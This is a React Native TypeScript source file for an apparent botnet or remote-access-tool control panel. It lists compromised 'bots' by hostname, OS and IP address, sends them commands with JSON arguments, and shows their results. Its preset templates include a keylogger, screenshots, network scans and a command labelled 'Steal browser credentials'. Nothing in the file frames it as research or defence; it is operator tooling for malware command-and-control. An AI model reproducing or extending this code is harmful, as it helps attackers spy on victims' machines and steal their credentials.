// Commands Management Screen Component

import React, { useState, useEffect } from 'react';
import {
  View,
  Text,
  StyleSheet,
  FlatList,
  TouchableOpacity,
  TextInput,
  Alert,
  Modal,
  ScrollView,
} from 'react-native';
import { Ionicons } from '@expo/vector-icons';
import { useNavigation, useRoute } from '@react-navigation/native';

// Import services and types
import apiService from '../../services/api';
import { Bot, Command, CommandRequest } from '../../types';
import { COLORS, SPACING, FONT_SIZES, BORDER_RADIUS, SHADOWS, TASK_TYPES } from '../../constants';

interface RouteParams {
  prefillBot?: Bot;
  prefillCommand?: string;
  prefillArgs?: Record<string, any>;
}

export default function CommandsScreen() {
  const navigation = useNavigation();
  const route = useRoute();
  const params = route.params as RouteParams;

  const [bots, setBots] = useState<Bot[]>([]);
  const [selectedBot, setSelectedBot] = useState<Bot | null>(null);
  const [command, setCommand] = useState('');
  const [args, setArgs] = useState('');
  const [commandHistory, setCommandHistory] = useState<Command[]>([]);
  const [showBotSelector, setShowBotSelector] = useState(false);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    loadBots();
    loadCommandHistory();

    // Handle prefilled data from navigation
    if (params) {
      if (params.prefillBot) {
        setSelectedBot(params.prefillBot);
      }
      if (params.prefillCommand) {
        setCommand(params.prefillCommand);
      }
      if (params.prefillArgs) {
        setArgs(JSON.stringify(params.prefillArgs, null, 2));
      }
    }
  }, [params]);

  const loadBots = async () => {
    try {
      const result = await apiService.getBots();
      if (result.success && result.data) {
        setBots(result.data);
      }
    } catch (error) {
      console.error('Failed to load bots:', error);
    }
  };

  const loadCommandHistory = async () => {
    try {
      const result = await apiService.getTasks();
      if (result.success && result.data) {
        // Convert tasks to commands format
        const commands: Command[] = result.data.map(task => ({
          id: task.id,
          bot_id: task.bot_id,
          command: task.command,
          args: task.args ? JSON.parse(task.args) : undefined,
          timestamp: task.created_at,
          status: task.status,
          result: task.result,
        }));
        setCommandHistory(commands.slice(0, 20)); // Last 20 commands
      }
    } catch (error) {
      console.error('Failed to load command history:', error);
    }
  };

  const sendCommand = async () => {
    if (!selectedBot) {
      Alert.alert('Error', 'Please select a bot');
      return;
    }

    if (!command.trim()) {
      Alert.alert('Error', 'Please enter a command');
      return;
    }

    setLoading(true);
    try {
      let parsedArgs = {};
      if (args.trim()) {
        try {
          parsedArgs = JSON.parse(args);
        } catch (error) {
          Alert.alert('Error', 'Invalid JSON in arguments');
          setLoading(false);
          return;
        }
      }

      const commandRequest: CommandRequest = {
        bot_id: selectedBot.id,
        command: command.trim(),
        args: parsedArgs,
      };

      const result = await apiService.sendCommand(commandRequest);

      if (result.success) {
        Alert.alert('Success', 'Command sent successfully!');
        setCommand('');
        setArgs('');
        loadCommandHistory(); // Refresh history
      } else {
        Alert.alert('Error', result.error || 'Failed to send command');
      }
    } catch (error) {
      Alert.alert('Error', 'Failed to send command');
    } finally {
      setLoading(false);
    }
  };

  const getStatusColor = (status: string) => {
    switch (status.toLowerCase()) {
      case 'completed':
        return COLORS.success;
      case 'running':
        return COLORS.warning;
      case 'failed':
        return COLORS.error;
      case 'pending':
        return COLORS.info;
      default:
        return COLORS.textSecondary;
    }
  };

  const CommandTemplate = ({ title, cmd, description, argExample }: {
    title: string;
    cmd: string;
    description: string;
    argExample?: string;
  }) => (
    <TouchableOpacity
      style={styles.templateCard}
      onPress={() => {
        setCommand(cmd);
        if (argExample) {
          setArgs(argExample);
        }
      }}
    >
      <View style={styles.templateIcon}>
        <Ionicons name="terminal" size={20} color={COLORS.primary} />
      </View>
      <View style={styles.templateContent}>
        <Text style={styles.templateTitle}>{title}</Text>
        <Text style={styles.templateDescription}>{description}</Text>
        <Text style={styles.templateCommand}>{cmd}</Text>
      </View>
    </TouchableOpacity>
  );

  const CommandHistoryItem = ({ item }: { item: Command }) => (
    <View style={styles.historyItem}>
      <View style={styles.historyHeader}>
        <Text style={styles.historyCommand} numberOfLines={1}>
          {item.command}
        </Text>
        <View style={[styles.statusBadge, { backgroundColor: getStatusColor(item.status) }]}>
          <Text style={styles.statusText}>{item.status}</Text>
        </View>
      </View>
      <Text style={styles.historyBot}>
        Bot: {item.bot_id.slice(0, 8)}...
      </Text>
      <Text style={styles.historyTime}>
        {new Date(item.timestamp).toLocaleString()}
      </Text>
      {item.result && (
        <Text style={styles.historyResult} numberOfLines={2}>
          Result: {item.result}
        </Text>
      )}
    </View>
  );

  const BotSelectorItem = ({ bot }: { bot: Bot }) => (
    <TouchableOpacity
      style={styles.botSelectorItem}
      onPress={() => {
        setSelectedBot(bot);
        setShowBotSelector(false);
      }}
    >
      <View style={styles.botSelectorIcon}>
        <Ionicons name="hardware-chip" size={20} color={COLORS.primary} />
      </View>
      <View style={styles.botSelectorInfo}>
        <Text style={styles.botSelectorName}>{bot.hostname || bot.id}</Text>
        <Text style={styles.botSelectorDetails}>
          {bot.os_info} • {bot.ip_address}
        </Text>
      </View>
      <View style={[styles.botStatus, { backgroundColor: getStatusColor(bot.status) }]}>
        <Text style={styles.botStatusText}>{bot.status}</Text>
      </View>
    </TouchableOpacity>
  );

  return (
    <View style={styles.container}>
      <ScrollView showsVerticalScrollIndicator={false}>
        {/* Command Composer */}
        <View style={styles.composerContainer}>
          <Text style={styles.sectionTitle}>Send Command</Text>

          {/* Bot Selector */}
          <TouchableOpacity
            style={styles.botSelector}
            onPress={() => setShowBotSelector(true)}
          >
            <Ionicons name="hardware-chip" size={20} color={COLORS.primary} />
            <Text style={styles.botSelectorText}>
              {selectedBot ? (selectedBot.hostname || selectedBot.id) : 'Select a bot...'}
            </Text>
            <Ionicons name="chevron-down" size={20} color={COLORS.textSecondary} />
          </TouchableOpacity>

          {/* Command Input */}
          <TextInput
            style={styles.commandInput}
            value={command}
            onChangeText={setCommand}
            placeholder="Enter command (e.g., system_info, screenshot)"
            autoCapitalize="none"
            autoCorrect={false}
          />

          {/* Arguments Input */}
          <TextInput
            style={[styles.commandInput, styles.argsInput]}
            value={args}
            onChangeText={setArgs}
            placeholder='Arguments (JSON format, e.g., {"path": "/tmp"})'
            multiline
            numberOfLines={3}
            autoCapitalize="none"
            autoCorrect={false}
          />

          {/* Send Button */}
          <TouchableOpacity
            style={[styles.sendButton, (!selectedBot || !command.trim() || loading) && styles.sendButtonDisabled]}
            onPress={sendCommand}
            disabled={!selectedBot || !command.trim() || loading}
          >
            <Ionicons name="send" size={20} color="#ffffff" style={styles.sendIcon} />
            <Text style={styles.sendButtonText}>
              {loading ? 'Sending...' : 'Send Command'}
            </Text>
          </TouchableOpacity>
        </View>

        {/* Command Templates */}
        <View style={styles.templatesContainer}>
          <Text style={styles.sectionTitle}>Command Templates</Text>
          <ScrollView horizontal showsHorizontalScrollIndicator={false}>
            <CommandTemplate
              title="System Info"
              cmd="system_info"
              description="Get system information"
            />
            <CommandTemplate
              title="Network Scan"
              cmd="network_scan"
              description="Scan network interfaces"
            />
            <CommandTemplate
              title="Process List"
              cmd="process_list"
              description="Get running processes"
            />
            <CommandTemplate
              title="Screenshot"
              cmd="screenshot"
              description="Capture screenshot"
              argExample='{"path": "screenshot.png"}'
            />
            <CommandTemplate
              title="Keylogger"
              cmd="keylogger"
              description="Start keylogger"
            />
            <CommandTemplate
              title="Browser Data"
              cmd="browser_data"
              description="Steal browser credentials"
            />
          </ScrollView>
        </View>

        {/* Command History */}
        <View style={styles.historyContainer}>
          <Text style={styles.sectionTitle}>Command History</Text>
          {commandHistory.length > 0 ? (
            commandHistory.map((item) => (
              <CommandHistoryItem key={item.id} item={item} />
            ))
          ) : (
            <Text style={styles.emptyText}>No command history available</Text>
          )}
        </View>
      </ScrollView>

      {/* Bot Selector Modal */}
      <Modal
        visible={showBotSelector}
        animationType="slide"
        transparent={true}
        onRequestClose={() => setShowBotSelector(false)}
      >
        <View style={styles.modalOverlay}>
          <View style={styles.modalContent}>
            <View style={styles.modalHeader}>
              <Text style={styles.modalTitle}>Select Bot</Text>
              <TouchableOpacity onPress={() => setShowBotSelector(false)}>
                <Ionicons name="close" size={24} color={COLORS.text} />
              </TouchableOpacity>
            </View>
            <FlatList
              data={bots}
              renderItem={({ item }) => <BotSelectorItem bot={item} />}
              keyExtractor={(item) => item.id}
              showsVerticalScrollIndicator={false}
            />
          </View>
        </View>
      </Modal>
    </View>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: COLORS.background,
  },
  composerContainer: {
    backgroundColor: COLORS.surface,
    margin: SPACING.md,
    padding: SPACING.lg,
    borderRadius: BORDER_RADIUS.lg,
    ...SHADOWS.md,
  },
  sectionTitle: {
    fontSize: FONT_SIZES.lg,
    fontWeight: 'bold',
    color: COLORS.text,
    marginBottom: SPACING.md,
  },
  botSelector: {
    flexDirection: 'row',
    alignItems: 'center',
    backgroundColor: COLORS.surfaceVariant,
    padding: SPACING.md,
    borderRadius: BORDER_RADIUS.md,
    marginBottom: SPACING.md,
  },
  botSelectorText: {
    flex: 1,
    fontSize: FONT_SIZES.md,
    color: COLORS.text,
    marginHorizontal: SPACING.md,
  },
  commandInput: {
    borderWidth: 1,
    borderColor: COLORS.border,
    borderRadius: BORDER_RADIUS.md,
    padding: SPACING.md,
    fontSize: FONT_SIZES.md,
    backgroundColor: COLORS.surface,
    marginBottom: SPACING.md,
  },
  argsInput: {
    height: 80,
    textAlignVertical: 'top',
  },
  sendButton: {
    backgroundColor: COLORS.primary,
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
    padding: SPACING.md,
    borderRadius: BORDER_RADIUS.md,
    ...SHADOWS.sm,
  },
  sendButtonDisabled: {
    backgroundColor: COLORS.textMuted,
  },
  sendIcon: {
    marginRight: SPACING.sm,
  },
  sendButtonText: {
    color: '#ffffff',
    fontSize: FONT_SIZES.md,
    fontWeight: 'bold',
  },
  templatesContainer: {
    backgroundColor: COLORS.surface,
    margin: SPACING.md,
    padding: SPACING.lg,
    borderRadius: BORDER_RADIUS.lg,
    ...SHADOWS.md,
  },
  templateCard: {
    backgroundColor: COLORS.surfaceVariant,
    padding: SPACING.md,
    borderRadius: BORDER_RADIUS.md,
    marginRight: SPACING.md,
    width: 200,
    ...SHADOWS.sm,
  },
  templateIcon: {
    width: 40,
    height: 40,
    borderRadius: 20,
    backgroundColor: COLORS.surface,
    justifyContent: 'center',
    alignItems: 'center',
    marginBottom: SPACING.sm,
  },
  templateContent: {
    flex: 1,
  },
  templateTitle: {
    fontSize: FONT_SIZES.md,
    fontWeight: 'bold',
    color: COLORS.text,
  },
  templateDescription: {
    fontSize: FONT_SIZES.sm,
    color: COLORS.textSecondary,
    marginTop: SPACING.xs,
  },
  templateCommand: {
    fontSize: FONT_SIZES.sm,
    color: COLORS.primary,
    marginTop: SPACING.xs,
    fontFamily: 'monospace',
  },
  historyContainer: {
    backgroundColor: COLORS.surface,
    margin: SPACING.md,
    padding: SPACING.lg,
    borderRadius: BORDER_RADIUS.lg,
    ...SHADOWS.md,
    marginBottom: SPACING.xxl,
  },
  historyItem: {
    backgroundColor: COLORS.surfaceVariant,
    padding: SPACING.md,
    borderRadius: BORDER_RADIUS.md,
    marginBottom: SPACING.sm,
  },
  historyHeader: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    marginBottom: SPACING.xs,
  },
  historyCommand: {
    fontSize: FONT_SIZES.md,
    fontWeight: '500',
    color: COLORS.text,
    flex: 1,
  },
  statusBadge: {
    paddingHorizontal: SPACING.sm,
    paddingVertical: SPACING.xs,
    borderRadius: BORDER_RADIUS.sm,
  },
  statusText: {
    fontSize: FONT_SIZES.xs,
    color: '#ffffff',
    fontWeight: 'bold',
  },
  historyBot: {
    fontSize: FONT_SIZES.sm,
    color: COLORS.textSecondary,
  },
  historyTime: {
    fontSize: FONT_SIZES.sm,
    color: COLORS.textMuted,
    marginTop: SPACING.xs,
  },
  historyResult: {
    fontSize: FONT_SIZES.sm,
    color: COLORS.primary,
    marginTop: SPACING.xs,
  },
  emptyText: {
    fontSize: FONT_SIZES.md,
    color: COLORS.textMuted,
    textAlign: 'center',
    padding: SPACING.lg,
  },
  modalOverlay: {
    flex: 1,
    backgroundColor: 'rgba(0, 0, 0, 0.5)',
    justifyContent: 'flex-end',
  },
  modalContent: {
    backgroundColor: COLORS.surface,
    borderTopLeftRadius: BORDER_RADIUS.xl,
    borderTopRightRadius: BORDER_RADIUS.xl,
    maxHeight: '70%',
  },
  modalHeader: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    padding: SPACING.lg,
    borderBottomWidth: 1,
    borderBottomColor: COLORS.border,
  },
  modalTitle: {
    fontSize: FONT_SIZES.lg,
    fontWeight: 'bold',
    color: COLORS.text,
  },
  botSelectorItem: {
    flexDirection: 'row',
    alignItems: 'center',
    padding: SPACING.md,
    borderBottomWidth: 1,
    borderBottomColor: COLORS.borderLight,
  },
  botSelectorIcon: {
    width: 40,
    height: 40,
    borderRadius: 20,
    backgroundColor: COLORS.surfaceVariant,
    justifyContent: 'center',
    alignItems: 'center',
    marginRight: SPACING.md,
  },
  botSelectorInfo: {
    flex: 1,
  },
  botSelectorName: {
    fontSize: FONT_SIZES.md,
    fontWeight: '500',
    color: COLORS.text,
  },
  botSelectorDetails: {
    fontSize: FONT_SIZES.sm,
    color: COLORS.textSecondary,
    marginTop: SPACING.xs,
  },
  botStatus: {
    paddingHorizontal: SPACING.sm,
    paddingVertical: SPACING.xs,
    borderRadius: BORDER_RADIUS.sm,
  },
  botStatusText: {
    fontSize: FONT_SIZES.xs,
    color: '#ffffff',
    fontWeight: 'bold',
  },
});
